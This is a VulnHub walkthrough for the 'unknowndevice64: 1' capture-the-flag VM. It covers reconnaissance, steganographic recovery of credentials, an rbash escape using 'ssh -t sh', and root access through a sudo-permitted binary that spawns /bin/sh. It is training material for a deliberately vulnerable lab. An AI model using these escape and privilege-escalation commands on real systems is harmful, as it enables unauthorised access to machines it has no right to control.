
# unknowndevice64: 1 — VulnHub Walkthrough

**Difficulty:** Intermediate  
**Goal:** Get root and read `/root/flag.txt`  
**Focus Areas:** Steganography, Web Exploitation, Restricted Shell Escape

---

## 🛠️ Setup

- Download VM from VulnHub
- Recommended: Use **VirtualBox**
- Ensure your machine and target VM are on the same network

---

## 1. Finding Target IP

Use `netdiscover` to locate the target:

```bash
netdiscover -i eth0 -r <your-network-range>
```

Target IP found:

```
192.168.133.215
```

---

## 2. Nmap Enumeration

Scan open ports and services:

```bash
nmap -sV 192.168.133.215
```

Result:
- **Port 31337/tcp** open — Simple Python Web Server

---

## 3. Web Page Analysis

Access:

```
http://192.168.133.215:31337
```

- Dark-themed page
- Found hint in page source:
  ```
  key_is_h1dd3n.jpg
  ```

Download the hidden image:

```
http://192.168.133.215:31337/key_is_h1dd3n.jpg
```

---

## 4. Steganography

Check file type:

```bash
file key_is_h1dd3n.jpg
```

Extract hidden data using **"h1dd3n"** as the passphrase.  
Recovered file:

```
h1dd3n.txt
```

---

## 5. Decoding h1dd3n.txt

The file content was encoded in **Brainfuck**.

Used [dCode Brainfuck Decoder](https://www.dcode.fr/brainfuck-language) to decode.  
Found credentials:

```
Username: ud64
Password: 1M!#64@ud
```

---

## 6. SSH Access

Login with SSH:

```bash
ssh ud64@192.168.133.215 -p 1337
```

- Shell is restricted (`rbash`).
- Commands like `ls`, `cd` blocked.

Bypass restricted shell:

```bash
ssh ud64@192.168.133.215 -p 1337 -t sh
```

---

## 7. Privilege Escalation

List files:

```bash
ls -la
```

Found binary:

```bash
sudo /usr/bin/sysud64
```

Exploit it:

```bash
sudo sysud64 -o /dev/null /bin/sh
```

Confirm root:

```bash
whoami
```

---

## 8. Capture the Flag

Navigate and read the flag:

```bash
cd /root
cat flag.txt
```

✅ **Rooted Successfully!**

---

> “A hacker does for love what others would not do for money.”

---

